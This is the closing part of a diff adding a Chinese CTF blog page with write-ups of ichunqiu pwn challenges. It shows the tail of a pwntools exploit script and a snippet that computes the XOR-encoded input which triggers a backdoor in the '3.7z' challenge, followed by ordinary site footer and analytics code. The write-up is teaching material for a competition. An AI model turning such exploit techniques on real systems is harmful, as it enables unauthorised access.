<span class="number">20000</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ints_to_send:</span><br><span class="line">    r.sendline(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="3-7z"><a href="#3-7z" class="headerlink" title="3.7z"></a>3.7z</h1><p>这个题目就厉害了，居然有有一个backdoor，应该是题目设计者的问题吧，这个题目思路很简单，就是只要满足图下的check就可以拿到一个后门权限了</p>
+<p>后门的逻辑是这样的，只要输入的满足</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(<span class="string">&#x27;useragent&#x27;</span>)):</span><br><span class="line">  buf += chr(i^ord(<span class="string">&#x27;useragent&#x27;</span>[i])</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnme"><span class="toc-number">1.</span> <span class="toc-text">pwnme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#loading"><span class="toc-number">2.</span> <span class="toc-text">loading</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-7z"><span class="toc-number">3.</span> <span class="toc-text">3.7z</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/ichuqiu-pwn-November.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/ichuqiu-pwn-November.html&text=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/ichuqiu-pwn-November.html&is_video=false&description=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ichunqiu百度杯-十一月pwn专题&body=Check out this article: https://bestwing.me/ichuqiu-pwn-November.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/ichuqiu-pwn-November.html&title=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/ichuqiu-pwn-November.html&name=ichunqiu百度杯-十一月pwn专题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/ichuqiu-pwn-November.html&t=ichunqiu百度杯-十一月pwn专题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
